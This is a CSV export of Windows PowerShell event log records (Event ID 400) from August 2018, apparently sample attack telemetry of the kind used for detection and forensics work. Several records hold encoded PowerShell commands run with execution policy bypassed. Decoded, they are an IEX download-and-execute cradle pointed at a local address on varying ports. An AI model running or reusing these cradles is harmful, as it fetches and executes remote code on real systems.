"TimeCreated","Details","EventID"
	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADIAMwA5ADkAMwAvACcAKQApAA==
	EngineVersion=5.1.16299.547
	RunspaceId=9566b5c9-a1de-4b1f-b111-873a77dbbfe8
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","400"
"8/31/2018 3:14:43 AM","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=f8da00fd-8121-4cbe-a375-b81031daee00
	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADMAMgA4ADYANQAvACcAKQApAA==
	EngineVersion=5.1.16299.547
	RunspaceId=e38db2e4-a3ef-4666-949d-f9701cc1713a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","400"
"8/31/2018 2:55:19 AM","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=5ba41c00-6cd0-497f-acb1-8fb3041cda00
	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADEAOAA0ADYANAAvACcAKQApAA==
	EngineVersion=5.1.16299.547
	RunspaceId=b809ce77-6b7b-47e3-939d-820897e7184c
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","400"
"8/31/2018 2:08:47 AM","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=e35d6055-a1e5-4c0f-812c-bd985d4e209e
